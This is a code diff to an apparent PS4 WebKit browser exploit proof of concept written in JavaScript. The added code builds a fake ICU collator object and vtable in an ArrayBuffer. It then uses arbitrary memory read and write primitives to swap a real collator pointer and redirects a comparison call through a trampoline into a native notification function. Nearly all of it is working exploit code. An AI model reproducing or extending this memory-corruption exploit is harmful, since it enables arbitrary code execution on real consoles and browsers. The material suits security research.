@@ -14,6 +14,18 @@ const ARENA_MARKER = 0x52;
 const NOTIFICATION_REQUEST_SIZE = 0xc30;
 const NOTIFICATION_MESSAGE_OFFSET = 0x2d;
 const DEFAULT_MESSAGE = "PS4 WebKit PoC";
+/** Built once per page load — avoid repeat(0x2d) allocations */
+let cachedDefaultNotifyRequest = null;
+
+function getNotificationRequest(message) {
+    const msg = message || DEFAULT_MESSAGE;
+    if (msg === DEFAULT_MESSAGE) {
+        if (!cachedDefaultNotifyRequest)
+            cachedDefaultNotifyRequest = buildNotificationRequest(DEFAULT_MESSAGE);
+        return cachedDefaultNotifyRequest;
+    }
+    return buildNotificationRequest(msg);
+}
 const LK_TEXT_SCAN = 0x40000;
 const LK_TEXT_SCAN_STEP = 16;
 /** slopkit JSArrayBufferView.m_vector — default +0x10 only (OOM-safe) */
@@ -322,7 +334,7 @@ export function pinNotifyHeap(ctx) {
     if (!(compareFn("a", "b") < 0))
         throw new Error("notify pin: collator prewarm failed");
 
-    const notificationRequest = buildNotificationRequest(cfg.message);
+    const notificationRequest = getNotificationRequest(cfg.message);
     const arenaBuffer = new ArrayBuffer(ARENA_BYTES);
     const arenaView = new Uint8Array(arenaBuffer);
     arenaView[ARENA_MARKER_OFF] = 0x52;
@@ -336,10 +348,16 @@ export function pinNotifyHeap(ctx) {
     const arenaBacking = arrayBufferBacking(
         p, off, arenaBuffer, arenaView, leakval, log, {
             bufAddrOff: ctx.bufAddrOff || null,
-            arenaScan: ctx.params && ctx.params.get("arenascan") === "1",
+            arenaScan: false,
         });
     if (!arenaBacking)
         throw new Error("notify pin: arena backing @ +0x10 failed");
+
+    const fakeUCollatorAddr = arenaBacking.add32(FAKE_UCOLLATOR_OFFSET);
+    const fakeVtableAddr = arenaBacking.add32(FAKE_VTABLE_OFFSET);
+    putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00, fakeVtableAddr);
+    for (let i = 0x48; i < 0x50; i++) arenaView[FAKE_UCOLLATOR_OFFSET + i] = 0;
+    for (let i = 0x60; i < 0x68; i++) arenaView[FAKE_UCOLLATOR_OFFSET + i] = 0;
 
     log("NOTIFY-PIN-OK", "collator=" + realCollatorAddr + " arena=" + arenaBacking);
     return {
@@ -349,12 +367,58 @@ export function pinNotifyHeap(ctx) {
         arenaBuffer,
         arenaView,
         arenaBacking,
+        fakeUCollatorAddr,
+        fakeVtableAddr,
         realCollatorAddr,
         compareFnAddr,
+        collatorFieldAddr: realCollatorAddr.add32(COLLATOR_UCOLLATOR_OFF),
         webkitBase: ctx.webkitBase || null,
         nativeFn: ctx.nativeFn || null,
         cfg,
     };
+}
+
+/**
+ * Minimal fire — pinned prep only, ~3 primitive ops + compareFn (no stage/re-read heap).
+ */
+export function fireNotifyPinned(p, pin, lk, off, log) {
+    if (!p || !pin || !lk || !off)
+        throw new Error("notify fire: need p, pin, lk, off");
+    log = log || function () { };
+
+    const cfg = pin.cfg || {};
+    const gdRva = cfg.gd || off.wk_notify_gd || 0;
+    const ntRva = cfg.nt || off.k_notify || 0;
+    if (!gdRva || !ntRva)
+        throw new Error("notify fire: gd/nt missing in offset table");
+
+    log("NOTIFY-COMMIT", "lk=" + lk + " gd=0x" + gdRva.toString(16)
+        + " nt=0x" + ntRva.toString(16) + " (0-read)");
+
+    const notifyEntry = lk.add32(ntRva);
+    const trampoline = lk.add32(gdRva);
+    putLow48(pin.arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntry);
+    putLow48(pin.arenaView, FAKE_VTABLE_OFFSET + 0x128, trampoline);
+
+    const collatorOriginal = p.read8(pin.collatorFieldAddr);
+    p.write8(pin.collatorFieldAddr, pin.fakeUCollatorAddr);
+
+    let notifyResult = NaN;
+    let callError = null;
+    try {
+        notifyResult = pin.compareFn(pin.notificationRequest, "b");
+    } catch (err) {
+        callError = err;
+    }
+    p.write8(pin.collatorFieldAddr, collatorOriginal);
+
+    if (callError)
+        throw callError;
+
+    const ok = Number.isFinite(notifyResult) && Math.floor(notifyResult) === notifyResult;
+    const sent = ok && notifyResult === 0;
+    log("NOTIFY-DONE", "result=" + notifyResult + " sent=" + sent);
+    return { result: notifyResult, sent, ok };
 }
 
 /**
